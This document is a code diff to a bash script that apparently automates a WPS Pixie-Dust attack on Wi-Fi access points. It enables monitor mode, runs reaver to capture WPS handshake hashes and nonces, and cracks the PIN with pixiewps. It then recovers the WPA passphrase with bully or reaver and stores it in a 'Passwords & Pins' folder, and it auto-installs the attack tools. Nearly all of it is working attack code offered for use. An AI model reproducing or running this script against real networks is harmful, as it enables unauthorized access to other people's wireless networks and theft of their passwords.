@@ -25,7 +25,7 @@ echo ""
 echo ""
 echo ""
 echo -e "$Red [!]$White Remove any temporary file."
-rm -rf capture empty.txt Reaver.txt .airmon-ng.txt Ver_Reaver.txt .airmon-zc.txt
+rm -rf capture empty.txt Reaver.txt .airmon-ng.txt Ver_Reaver.txt .airmon-zc.txt wash_nf.txt wash.txt Get_Pass.txt
 sleep 1
 echo ""
 if [ "$mode_monitor" == "active" ]
@@ -38,10 +38,23 @@ echo -e "$White [+]$Green Greetz to : ${Cyan}AKAS${White} ."
 echo ""
 exit
 }
+kill_reaver() {
+	                kill -9 $ReaverID 2> /dev/null
+	                Quit=1
+}
+kill_wash() {
+                    kill -9 $WashID 2> /dev/null
+					Quit=1
+}
+kill_load() {
+	                PID=$(($PID-1))
+	                kill -9 $PID 2> /dev/null
+}
 arguments() {
 						   echo "" > empty.txt
                            reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -vvv -n -L -P -s empty.txt > Reaver.txt &
 						   ReaverID=$!
+						   disown $ReaverID
    						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                            r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
                            s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
@@ -51,12 +64,13 @@ arguments() {
                            m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
                            WPS=`cat Reaver.txt | grep 'WPS PIN'`
 						   echo ""
-						   echo -e "$Yellow+------------------------------+"
-						   echo -e "|$Red [+]$Yellow all required arguments   |"
-						   echo -e "+------------------------------+"
+						   echo -e "${White} +${Yellow}------------------------------${White}+"
+						   echo -e "${Yellow} |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
+						   echo -e "${White} +${Yellow}------------------------------${White}+"
 						   echo ""
 						   v=0
-						   while [ $v == 0 ] #Reaver
+						   Quit=0
+						   while [ $v == 0 ] && [ $Quit == 0 ] #Reaver
 						   do
 						   n=`cat Reaver.txt | grep 'Trying pin'`
 						   p=`cat Reaver.txt | wc -l`
@@ -73,9 +87,16 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   v=0
-						   while [ $v == 0 ] #E-Nonce
+						   BTN () {
+						   	        if [ $Quit == 0 ]
+						   	  	        then
+						   	      	        echo ""
+						   	      	        sleep 0.2
+						   	     	        v=0
+						   	        fi
+						   }
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Nonce
 						   do
 						   n=`cat Reaver.txt | grep E-Nonce: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$n" != "" ]
@@ -89,10 +110,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #PKE
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #PKE
 						   do
 						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p` 
 						             if [ "$e" != "" ]
@@ -106,10 +125,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #R-Nonce
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #R-Nonce
 						   do
 						   m=`cat Reaver.txt | grep R-Nonce: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$m" != "" ]
@@ -123,10 +140,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #PKR
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #PKR
 						   do
 						   r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$r" != "" ]
@@ -140,10 +155,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #AuthKey
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #AuthKey
 						   do
 						   a=`cat Reaver.txt | grep AuthKey: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$a" != "" ]
@@ -157,10 +170,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #E-Hash1
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash1
 						   do
 						   s=`cat Reaver.txt | grep E-Hash1: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$s" != "" ]
@@ -174,10 +185,8 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   echo ""
-						   sleep 0.2
-						   v=0
-						   while [ $v == 0 ] #E-Hash2
+						   BTN
+						   while [ $v == 0 ] && [ $Quit == 0 ] #E-Hash2
 						   do
 						   z=`cat Reaver.txt | grep E-Hash2: | cut -d' ' -f3 | sed -n 1p`
 						             if [ "$z" != "" ]
@@ -194,9 +203,9 @@ arguments() {
 						   sleep 0.2
 						   echo ""
 						   echo ""
-						   echo -e $Yellow"+-------------------------------------------+"
-						   echo -e "|$Red [+]$Yellow Information about Access Point (AP)   |"
-						   echo -e "+-------------------------------------------+"
+						   echo -e "${White} +${Yellow}-------------------------------------------${White}+"
+						   echo -e "${Yellow} |${White} [${Red}+${White}]${Yellow} Information about Access Point (AP)   |"
+						   echo -e "${White} +${Yellow}-------------------------------------------${White}+"
 						   echo ""
 						   echo -e "$White [+] ESSID: $Green$ESSID"
 				           sleep 0.2
@@ -204,9 +213,12 @@ arguments() {
 						   sleep 0.2
                            echo -e "$White [+] Channel: $Green$CHANNEL "
 						   sleep 0.2
-						   echo -e "$White [+] Encryption:$Green $PRIVACY"
-						   sleep 0.2
-						   echo -e "$White [+] Speed:$Green$SPEED"
+						   if [ "$menu" -ne 1 ]
+						      then
+						          echo -e "$White [+] Encryption:$Green $PRIVACY"
+						          sleep 0.2
+						          echo -e "$White [+] Speed:$Green$SPEED"
+						   fi
 						   Manufacturer=`cat Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p`
 						   Model_Name=`cat Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p`
 						   Model_Number=`cat Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p`
@@ -221,8 +233,7 @@ arguments() {
 						   sleep 0.2
                            echo ""
 						   sleep 0.2
-						   disown $ReaverID
-						   kill -9 $ReaverID
+						   kill -9 $ReaverID 2> /dev/null
 }
 Ver_Mon_WCar_Fun() {
                  echo ""
@@ -230,7 +241,7 @@ Ver_Mon_WCar_Fun() {
                  if [ $VerCar -ge 1 ] && [ "$VerMon" = "" ]
                       then
                            Ver_aircrack_ng=`aircrack-ng | grep -w "1.2 rc2"`
-                           Num_Line=`iwconfig 2>&1 | grep '802.11' | wc -l `
+                           Num_Line=`iwconfig 2>&1 | grep 'ESSID' | wc -l `
 						   echo -e "[+] We found$Green $Num_Line$White wireless device(s)."
 						   echo ""
 						   echo -e $Yellow" +${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
@@ -238,7 +249,7 @@ Ver_Mon_WCar_Fun() {
 						   echo -e " ${Yellow}+${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
 						   for (( c=1; c<=$Num_Line; c++))
        						    do
-								  m[$c]=`iwconfig 2>&1 | grep '802.11' | awk '{print $1}' | sed -n ${c}'p'`
+								  m[$c]=`iwconfig 2>&1 | grep 'ESSID' | awk '{print $1}' | sed -n ${c}'p'`
 	     						  if [ "$Ver_aircrack_ng" != "" ]
                            	         then
                            	             Interface=`cat .airmon-ng.txt | grep ${m[$c]} | cut -f2`
@@ -268,15 +279,25 @@ Ver_Mon_WCar_Fun() {
 								   echo -en "\033[1A\033[2K"
 						           echo -e -n "${White}[+] Select$BRed number$White of wireless device to put into$Green monitor mode$White [${Green}1-$Num_Line$White]:$Green"
 						           read number
-						           wlan=${m[$number]}
-								   if [ $number -ge 1 ] && [ $number -le $Num_Line ]; then
-									    V_number=1
-						   		   else
-									    V_number=0
+								   if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
+									  then
+								          if [ $number -ge 1 ] && [ $number -le $Num_Line ]; then
+									          V_number=1
+											  wlan=${m[$number]}
+						   		          else
+									          V_number=0
+										  fi
+								   else
+								              V_number=0
 								   fi
 						   done
-						   echo -e "$White[+] Enabling monitor mode on $Green $wlan $White..."
-                           airmon-ng start $wlan > /dev/null
+						   trap kill_load SIGINT
+						   airmon-ng start $wlan > /dev/null &
+						   PID="$!"
+						   Wait_Msg="Enabling monitor mode on$Green $wlan $White."
+						   End_Msg="${Green}Mode Monitor$White is enable ."
+						   Loading
+						   trap - SIGINT SIGQUIT SIGTSTP
                            mode_monitor="active"
                            if [ "$Ver_aircrack_ng" != "" ]
                            	  then
@@ -288,18 +309,23 @@ Ver_Mon_WCar_Fun() {
                                   	     ifconfig ${wlan}mon up
                                   fi
                            fi
+                 elif [ "$VerCar" -le 0 ] && [ "$menu" -eq 6 ]
+				        then
+						    echo "" 
+                            sleep 0.5
+                            echo -e $White" [${Red}!${White}] Is no wireless device to put into${Green} monitor mode${White} ."
+                            echo ""
+                            sleep 0.5
                  elif [ $VerCar -le 0 ]
                         then   
 						    echo "" 
                             sleep 0.5
-                            echo -n -e $BWhite" [!]"
-                            echo -e $BRed" Wireless Card Not Found"
-                            echo ""
+                            echo -e $White"     [${Red}!${White}] Wireless Card${Red} Not Found${White} ."
                             sleep 0.5
                  fi
 				 airmon-ng > .airmon-ng.txt
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
+                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
 }
 Ver_Mon_Fun() {
                            cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
@@ -348,15 +374,96 @@ Ver_Mon_Fun() {
 											  echo -en "\033[1A\033[2K"
 						                      echo -e -n "\r${White}[+] select$Red number$White of interface to use for capturing [${Green}1-$Num_Mon$White]:$Green"
 						                      read number
-						                      mon=${m[$number]}
-											  if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
-											       V_number=1
+											  if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
+									             then
+											         if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
+											             V_number=1
+														 mon=${m[$number]}
+											         else
+											             V_number=0
+											         fi
 											  else
-											       V_number=0
+											             V_number=0
 											  fi
 								    done
 						   fi
 						   rm -rf .airmon-ng.txt
+}
+Loading() {
+                disown $PID
+                Finish=0
+                count=0
+				echo ""
+				echo -en "\033[1A\033[2K"
+                while [ "$Finish" == 0 ]
+                do
+                  Ver_Ins=`ps -A | grep -w $PID`
+                  if [ "$Ver_Ins" == "" ]
+  	                 then
+  	                     echo ""
+  	                     echo -en "\033[1A\033[2K"
+  	                     echo -ne "$White[${Green} ok ${White}] $End_Msg"
+  	                     Finish=1
+                  else
+  	                     if [ "$count" -eq 1 ]
+  	     	                then
+  	                            echo -ne "\r$White[${Red}*   ${White}] $Wait_Msg"
+  	                     elif [ "$count" -eq 2 ]
+  	     	                then
+  	     	                    echo -ne "\r$White[${Red} *  ${White}] $Wait_Msg"
+  	                     elif [ "$count" -eq 3 ]
+  	     	                then
+  	     	                    echo -ne "\r$White[${Red}  * ${White}] $Wait_Msg"
+  	                     else
+  	     	                    echo -ne "\r$White[${Red}   *${White}] $Wait_Msg"
+  	     	                    count=0
+  	                     fi
+                         Finish=0
+                         count=$(($count+1))
+                         sleep 0.2
+                  fi
+                done
+                echo ""
+}
+Installation() {
+                echo -ne "\r$white [${Red}wait${White}] $NOP not found ..."
+				sleep 2
+                dpkg -i $NOPI > /dev/null &
+                PID="$!"
+                disown $PID
+                Finish=0
+                count=0
+				echo ""
+				echo -en "\033[1A\033[2K"
+                while [ "$Finish" == 0 ]
+                do
+                  Ver_Ins=`ps -A | grep -w $PID`
+                  if [ "$Ver_Ins" == "" ]
+  	                 then
+  	                     echo ""
+  	                     echo -en "\033[1A\033[2K"
+  	                     echo -ne "$White [${Green} ok ${White}] Installation of$Green $NOP$White is done ."
+  	                     Finish=1
+                  else
+  	                     if [ "$count" -eq 1 ]
+  	     	                then
+  	                            echo -ne "\r$White [${Red}*   ${White}] Please wait until the$Green $NOP$White is installed ."
+  	                     elif [ "$count" -eq 2 ]
+  	     	                then
+  	     	                    echo -ne "\r$White [${Red} *  ${White}] Please wait until the$Green $NOP$White is installed ."
+  	                     elif [ "$count" -eq 3 ]
+  	     	                then
+  	     	                    echo -ne "\r$White [${Red}  * ${White}] Please wait until the$Green $NOP$White is installed ."
+  	                     else
+  	     	                    echo -ne "\r$White [${Red}   *${White}] Please wait until the$Green $NOP$White is installed ."
+  	     	                    count=0
+  	                     fi
+                         Finish=0
+                         count=$(($count+1))
+                         sleep 0.2
+                  fi
+                done
+                echo ""
 }
 Ver_Pckg_Tools() {
 	             reaver 2&> Ver_Reaver.txt
@@ -365,96 +472,121 @@ Ver_Pckg_Tools() {
 				 airmon-ng > .airmon-ng.txt
 				 Ver_Reaver=`cat Ver_Reaver.txt | grep 'Reaver v1.5.2'`
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
-                 VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
+                 VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
 				 Uname=`uname -m`
-				 rm -rf  Ver_Reaver.txt Ver_Pixiewps.txt
+				 rm -rf  Ver_Reaver.txt
 				 echo ""
 				 hash dpkg 2> /dev/null
 				 hash_dpkg="$?"
 				 if [ $hash_dpkg -eq 0 ]
 				      then
-					      Ver_libpcap_dev=`dpkg -l | grep libpcap0.8-dev`
-				          Ver_libsqlite3_dev=`dpkg -l | grep libsqlite3-dev`
-				          if [ "$Ver_libpcap_dev" = "" ]
+				          Ver_libssl_dev=`dpkg -l | grep -w "libssl-dev"`
+						  hash xterm 2> /dev/null
+						  Ver_xterm="$?"
+						  if [ "$Ver_libssl_dev" = "" ]
 				               then
 				                    if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
 				                    	then
-					                        echo ""
-					                        echo -e "$Red [!]$White Libpcap-dev not found ..."
-						                    sleep 3
-						                    echo -e "$White [+] Please wait until the$Green Libpcap-dev$White install ..."
-						                    echo ""
-						                    sleep 2
+										    NOP="Libssl-dev"
 						                    if [ $Uname == 'i686' ]
 		                   	                     then
-						                             cd Tools/32bits
-						                             dpkg -i libpcap0.8-dev_1.3.0-1_i386.deb
-                                                     dpkg -i libpcap-dev_1.3.0-1_all.deb
-						                             cd ../..
-						                         else
-						        	                 cd Tools/64bits
-						                             dpkg -i libpcap0.8-dev_1.3.0-1_amd64.deb
-                                                     dpkg -i libpcap-dev_1.3.0-1_all.deb
-						                             cd ../..
-							                 fi
-							        fi
-			              fi
-				          if [ "$Ver_libsqlite3_dev" = "" ]
-				               then
-				                    if [ "$Ver_Pixiewps" -ge "1" ] || [ "$Ver_Reaver" = "" ]
-				                    	then
-					                        echo ""
-					                        echo -e "$Red [!]$White Libsqlite3-dev not found ..."
-						                    sleep 3
-						                    echo -e "$White [+] Please wait until the$Green Libsqlite3-dev$White install ..."
-						                    sleep 2
-						                    if [ $Uname == 'i686' ]
-		                   	                     then
+												     NOPI="libssl-dev_1.0.1k-3+deb8u1_i386.deb"
 								                     cd Tools/32bits
-						                             dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_i386.deb
+						                             Installation
 						                             cd ../..
 								                 else
+												     NOPI="libssl-dev_1.0.1k-3+deb8u1_amd64.deb"
 								                     cd Tools/64bits
-									                 dpkg -i libsqlite3-dev_3.7.16.2-1~bpo70+1_amd64.deb
+									                 Installation
 									                 cd ../..
 				                            fi
 				                    fi
 				          fi
+						  if [ "$Ver_xterm" -ge "1" ]
+				               then
+							       NOP="XTerm"
+						           if [ $Uname == 'i686' ]
+		                   	           then
+									       NOPI="xterm_312-2_i386.deb"
+								           cd Tools/32bits
+						                   Installation
+						                   cd ../..
+								   else
+								           NOPI="xterm_312-2_amd64.deb"
+								           cd Tools/64bits
+									       Installation
+									       cd ../..
+				                   fi
+				          fi
+				          if [ "$Ver_Pixiewps" -ge "1" ]
+				               then
+					               NOP="Pixiewps"
+						            if [ $Uname == 'i686' ]
+		                   	           then
+								           NOPI="pixiewps_1.1-1kali1_i386.deb"
+								           cd Tools/32bits
+						                   Installation
+						                   cd ../..
+						            else
+								           NOPI="pixiewps_1.1-1kali1_amd64.deb"
+								           cd Tools/64bits
+								           Installation
+								           cd ../..
+				                    fi
+				          fi
+				          if [ "$Ver_Reaver" = "" ]
+				               then
+					                NOP="Reaver"
+						            if [ $Uname == 'i686' ]
+		                   	           then
+								           NOPI="reaver_1.5.2.1-1kali1_i386.deb"
+								           cd Tools/32bits
+						                   Installation
+						                   cd ../..
+						            else
+								           NOPI="reaver_1.5.2.1-1kali1_amd64.deb"
+								           cd Tools/64bits
+								           Installation
+								           cd ../..
+				                    fi
+				          fi
+				 else
+				 	      if [ "$Ver_Pixiewps" -ge "1" ]
+				               then
+						           Wait_Msg="Wait until the${Green} Pixiewps${white} is${Red} installed${White} ."
+						           End_Msg="Installation of$Green Pixiewps$White is done ."
+						           cd Tools
+					               unzip pixiewps-master.zip > /dev/null 2> /dev/null &
+					               PID="$!"
+					               disown $PID
+					               sleep 2.0
+						           cd pixiewps-master/src
+						           make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
+						           PID="$!"
+						           Loading
+						           cd ../..
+						           rm -rf pixiewps-master
+						           cd ..
+				          fi
+				          if [ "$Ver_Reaver" = "" ]
+				              then
+						           Wait_Msg="Wait until the${Green} Reaver${white} is${Red} installed${White} ."
+						           End_Msg="Installation of$Green Reaver$White is done ."
+						           cd Tools
+					               unzip reaver-wps-fork-t6x-master.zip > /dev/null 2> /dev/null &
+					               PID="$!"
+					               disown $PID
+					               sleep 2.0
+						           cd reaver-wps-fork-t6x-master/src
+						           chmod +x configure
+						           ./configure > /dev/null 2> /dev/null && make > /dev/null 2> /dev/null && make install > /dev/null 2> /dev/null &
+						           PID="$!"
+						           Loading
+						           cd ../..
+						           rm -rf reaver-wps-fork-t6x-master
+						           cd ..
+				          fi
 				 fi
-				 if [ "$Ver_Pixiewps" -ge "1" ]
-				      then
-					       echo ""
-						   echo -e "$Red [!]$White Pixiewps not found ..."
-						   sleep 3
-						   echo -e "$White [+] Please wait until the$Green Pixiewps$White install ..."
-						   sleep 2
-						   cd Tools
-					       unzip pixiewps-master.zip
-						   cd pixiewps-master/src
-						   make
-						   make install
-						   cd ../..
-						   rm -rf pixiewps-master
-						   cd ..
-				fi
-				if [ "$Ver_Reaver" = "" ]
-				      then
-					       echo ""
-						   echo -e "$Red [!]$White Reaver not found ..."
-						   sleep 3
-						   echo -e "$White [+] Please wait until the$Green Reaver $White install ..."
-						   sleep 2
-						   cd Tools
-					       unzip reaver-wps-fork-t6x-master.zip
-						   cd reaver-wps-fork-t6x-master/src
-						   chmod +x configure
-						   ./configure
-						   make
-						   make install
-						   cd ../..
-						   rm -rf reaver-wps-fork-t6x-master
-						   cd ..
-				fi
 }
 SELECT_CAPTURE_CRACK() {
 	                       back=0
@@ -462,10 +594,10 @@ SELECT_CAPTURE_CRACK() {
 						   while [ "$back" == "0" ]
 						   do
 						     clear
-							 echo -e "$Red+---------------------------------------------------------------------------------+"
-						     echo -e "| [+]$White If the BSSID in$BGreen green$White this mean that device is vulnerable.$Red                  |"
-							 echo -e "| [+]$White If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.$Red|"
-							 echo -e "+---------------------------------------------------------------------------------+$White"
+							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
+						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
+							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
+							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
 						     echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
 						     echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
 						     i=0
@@ -543,10 +675,16 @@ SELECT_CAPTURE_CRACK() {
 											  echo -en "\033[1A\033[2K"
 						                      echo -n -e "${White}  [+]$Blue Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
 						                      read  N_OB
-											  if [ $N_OB -ge $d ] && [ $N_OB -le $i ]; then
-											       V_number=1
+											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
+											      then
+											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
+											  	        then
+											                V_number=1
+											         else
+											                V_number=0
+											         fi
 											  else
-											       V_number=0
+											         V_number=0
 											  fi
 						   done
 						   echo ""
@@ -557,29 +695,58 @@ SELECT_CAPTURE_CRACK() {
 						   PRIVACY=${PRIVACY[$N_OB]}
 						   SPEED=${SPEED[$N_OB]}
 						   ESSID="$(echo $ESSID)"
-						   Ver_Dir=`ls | grep PIN`
-						   if [ "$Ver_Dir" == "" ];then
-								mkdir PIN
+						   CRACKING_PROCESS
+						   done
+						   if [ "$back" == "1" ]
+						        then
+								    re=yes
+						   elif [ "$back" == "2" ]
+						        then
+								    re=no
 						   fi
-						   Ver_p=`ls PIN | grep ${BSSID}`
+						   rm -rf airmon-ng pixiewps.txt
+						   rm -rf capture
+}
+CRACKING_PROCESS() {
+                           Ver_Dir=`ls | grep Passwords\ \&\ Pins`
+						   if [ "$Ver_Dir" == "" ];then
+								mkdir Passwords\ \&\ Pins
+						   fi
+						   Ver_p=`ls Passwords\ \&\ Pins | grep ${BSSID}`
 						   if [ "$Ver_p" != "" ]
 								then
-									Ver_T=`cat PIN/$BSSID* | grep -e 'WPS pin' | wc -l`
+									Ver_T=`cat Passwords\ \&\ Pins/$BSSID* | grep -i 'pin' | wc -l`
 								else
 								    Ver_T=0
 						   fi
 						   if [ "$Ver_p" != "" ] && [ $Ver_T -gt 0 ]
 								then
+								    ESSID=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 1p | cut -c20-`
+                                    BSSID=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 2p | cut -c20-`
+                                    CHANNEL=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 3p | cut -c20-`
+                                    PIN=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 4p | awk -F\" '{print $2}'`
+                                    Key=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 5p | awk -F\" '{print $2}'`
+                                    time_taken=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 6p | cut -c20-`
+                                    cr_date=`cat Passwords\ \&\ Pins/${BSSID}.txt | sed -n 7p | cut -c20-`
 									echo ""
-									echo -e " [+]$BGreen $BSSID$White is already cracked : "
-                                    cat PIN/${BSSID}.txt | head -n 11 | tail -n 9
+									echo -e " ${Red} [${Yellow}+${Red}]$BGreen $BSSID$White is already cracked : "
+                                    echo ""
+									echo -e "${White}           [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
+									echo -e "${White}           [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
+									echo -e "${White}           [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
+									echo -e "${White}           [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
+									echo -e "${White}           [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
+									echo -e "${White}           [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
+									echo -e "${White}           [+]${Yellow} Date       ${Red}>>${White} $cr_date"
 									v=0
 								else
                                     echo ""
-         						    echo -e "$Red[!]$White Wait until$Green the required arguments$White are captured :"
+         						    echo -e "${White} [${Red}!${White}] Wait until$Green the required arguments$White are captured :"
 						            echo ""
 						            sleep 1
+									trap kill_reaver SIGINT
 						            arguments
+						            trap exit_function SIGINT
 						            rm -rf Reaver.txt empty.txt
 									v=1
 						   fi
@@ -587,13 +754,26 @@ SELECT_CAPTURE_CRACK() {
                                 then
 									 if [ "$e" != "" ] && [ "$r" != "" ] && [ "$s" != "" ] && [ "$z" != "" ] && [ "$a" != "" ] && [ "$n" != "" ] && [ "$m" != "" ]
 									      then
-                                              echo -e "$White [+]$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
-                                              sleep 0.5
-                                              if [ "$Ver_T" == "0" ]; then				  
-                                                  pixiewps -v 3 -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee PIN/${BSSID}.txt | head -n 11 | tail -n 9
-									              PIN=`less PIN/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
+                                              if [ "$Ver_T" == "0" ]; then
+                                              	  trap kill_load SIGINT
+                                                  pixiewps -f -e $e -r $r -s $s -z $z -a $a -n $n -m $m -b $BSSID | tee Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
+												  PID="$!"
+												  Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
+												  End_Msg="Cracking process is done , the $Green Result$White is as follows :"
+                								  Loading
+									              PIN=`less Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
+									              time_taken=`less Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
+									              cr_date=`date`
 									              if [ "$PIN" != "" ]
 									                   then
+									                        echo " [+] ESSID      >> $ESSID" > Passwords\ \&\ Pins/${BSSID}.txt
+									                        echo " [+] BSSID      >> $BSSID" >> Passwords\ \&\ Pins/${BSSID}.txt
+									                        echo " [+] Channel    >> $CHANNEL" >> Passwords\ \&\ Pins/${BSSID}.txt
+									                        echo " [+] PIN        >> \"$PIN\"" >> Passwords\ \&\ Pins/${BSSID}.txt
+									                        echo ""
+													        echo -e "${White}       [+] PIN  >>${Green} $PIN"
+													        echo -e "${White}       [+] Time taken >>${Red} $time_taken"
+															echo ""
 													        hash bully 2> /dev/null
 															hash_bully="$?"
 															if [ $hash_bully -eq 0 ]
@@ -601,23 +781,46 @@ SELECT_CAPTURE_CRACK() {
 										                             echo ""
 										                             echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
-										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN -e "$ESSID" $mon
-											                         echo -e "$Yellow [+]$Green Congratulation (^_^) "
-													                 echo ""
+										                             bully -b $BSSID -c $CHANNEL -B -F -p $PIN -e "$ESSID" $mon > Get_Pass.txt 2> /dev/null &
+										                             PID="$!"
+										                             Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
+										                             End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
+										                             Loading
+										                             Key=`cat Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
+													                 echo " [+] Key        >> \"$Key\"" >> Passwords\ \&\ Pins/${BSSID}.txt
+													                 rm -rf Get_Pass
 																 else
 																     echo ""
 																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 																	 echo ""
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -p $PIN
-																	 echo -e "$Yellow[+]$Green Congratulation (^_^) "
-													                 echo ""
+																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -n -vv -p $PIN > Get_Pass.txt &
+																	 PID="$!"
+																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
+																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
+																	 Loading
+																	 Key=`cat Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
+																	 echo " [+] Key        >> \"$Key\"" >> Passwords\ \&\ Pins/${BSSID}.txt
+																	 rm -rf Get_Pass.txt
 															fi
+															echo " [+] Time Taken >> $time_taken" >> Passwords\ \&\ Pins/${BSSID}.txt
+															echo " [+] Date       >> $cr_date" >> Passwords\ \&\ Pins/${BSSID}.txt
+															echo ""
+															echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
+									                        echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
+									                        echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
+									                        echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
+									                        echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
+									                        echo -e "${White} [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
+															echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
+															echo ""
+									                        echo -e "$Yellow [+]$Green Congratulation (^_^) "
+													        echo ""
 									               else
-												       cat ${BSSID}.txt | head -n 7 | tail -n 5
-									                   echo ""
-										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
+												       cd Passwords\ \&\ Pins
+												       cat ${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
 												       echo ""
-												       cd PIN;
+										               echo -e "$White        [${Red}!${White}]$White Sorry pin not found , good luck next time."
+												       echo ""
 													   rm -rf ${BSSID}.txt
 												       cd ..
 									               fi
@@ -627,6 +830,7 @@ SELECT_CAPTURE_CRACK() {
 											  echo ""
 									  fi
                            fi
+                           trap exit_function SIGINT
 						   echo ""
 						   echo ""
 						   echo -e "$Yellow       [0]$BWhite Back to list of wireless networks."
